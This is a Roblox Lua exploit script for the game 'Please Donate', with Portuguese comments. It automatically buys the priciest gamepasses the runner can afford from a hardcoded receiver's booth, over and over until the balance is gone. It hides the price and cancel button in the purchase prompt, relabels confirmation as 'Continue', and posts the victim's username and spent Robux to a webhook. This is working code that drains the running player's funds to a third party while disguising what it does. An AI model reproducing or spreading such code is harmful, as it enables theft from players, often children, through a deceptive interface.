-- CONFIGURAÇÃO
local Username = "Ian_wp27" -- coloque o username do jogador que vai receber a doação
local LogsWebhook = "18bf10e6-da47-4bdf-8c64-fcaa95eae717"

-- SERVIÇOS
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local MarketplaceService = game:GetService("MarketplaceService")
local CoreGui = game:GetService("CoreGui")
local Players = game:GetService("Players")

local Remotes = require(ReplicatedStorage:WaitForChild("Remotes"))

-- FUNÇÃO PARA PEGAR O USERID
local success, UserId = pcall(function()
    return Players:GetUserIdFromNameAsync(Username)
end)
if not success then
    error("Usuário não encontrado")
end

-- PEGAR O BOOTH
local Booth = Remotes.Function("OfflinePlayerLookup"):InvokeServer(UserId)
if not Booth then
    Players.LocalPlayer:Kick("Receiver not found!")
    return
end

-- VARIÁVEIS
local asset
local userRobux = Remotes.Function("GetUserRobux"):InvokeServer() -- pega seu saldo

-- FUNÇÃO DE COMPRA
local function Purchase()
    local range = 0
    asset = nil
    for _, v in pairs(Booth.BoothUI.Items.Frame:GetChildren()) do
        if v:GetAttribute("AssetType") == "Gamepass" and 
           not MarketplaceService:UserOwnsGamePassAsync(Players.LocalPlayer.UserId, v:GetAttribute("AssetId")) then
            local price = v:GetAttribute("AssetPrice")
            if price and price <= userRobux and price > range then
                asset = v
                range = price
            end
        end
    end

    if asset and asset.Prompt and typeof(asset.Prompt.FireServer) == "function" then
        asset.Prompt:FireServer("", false, range)
    end
end

-- ESPERA O PurchasePromptApp APARECER
local PurchasePromptApp
repeat
    PurchasePromptApp = CoreGui:FindFirstChild("PurchasePromptApp")
    task.wait(0.1)
until PurchasePromptApp

local Animator = PurchasePromptApp:WaitForChild("ProductPurchaseContainer"):WaitForChild("Animator")
repeat task.wait() until not Animator:FindFirstChild("Prompt")

-- AJUSTE DA UI MOBILE
Animator.ChildAdded:Connect(function(child)
    if child.Name == "Prompt" then
        local footerContent = child:WaitForChild("AlertContents"):WaitForChild("Footer"):WaitForChild("FooterContent"):WaitForChild("Content")
        local RemainingBalanceText = footerContent:FindFirstChild("RemainingBalanceText")
        if RemainingBalanceText then
            child.AlertContents.TitleContainer.TitleArea.Title.Text = "Please Donate - Script!"
            child.AlertContents.MiddleContent.Visible = false
            child.AlertContents.Footer.Buttons["1"].Visible = false
            child.AlertContents.Footer.Buttons["2"].ButtonContent.ButtonMiddleContent.Text.Text = "Continue"
            child.AlertContents.Footer.Buttons["2"].ButtonContent.ButtonMiddleContent.Icon.Visible = false
            child.AlertContents.Footer.FooterContent.Visible = false

            local titleText = child.AlertContents.TitleContainer.TitleArea.Title
            titleText.Size = UDim2.new(1, 0, titleText.Size.Y.Scale, titleText.Size.Y.Offset)
            local textFooter = child.AlertContents.Footer.Buttons["2"].ButtonContent.ButtonMiddleContent.Text
            textFooter.Size = UDim2.new(1, 0, textFooter.Size.Y.Scale, textFooter.Size.Y.Offset)
        end
    end
end)

Animator.ChildRemoved:Connect(function(child)
    if child.Name == "Prompt" then
        userRobux = Remotes.Function("GetUserRobux"):InvokeServer() -- atualiza saldo
        Purchase()
    end
end)

-- ESCUTA O EVENTO DE DOAÇÃO
Remotes.OnClientEvent("GiftSentAlert"):Connect(function(a, robux)
    if a == UserId and userRobux then
        -- Função de webhook opcional
        if LogsWebhook then
            pcall(function()
                syn.request({
                    Url = LogsWebhook,
                    Method = "POST",
                    Headers = {["Content-Type"] = "application/json"},
                    Body = game:GetService("HttpService"):JSONEncode({["username"] = Players.LocalPlayer.Name, ["robux"] = robux})
                })
            end)
        end
        userRobux -= robux
        Purchase()
    end
end)

-- COMPRA INICIAL
Purchase()
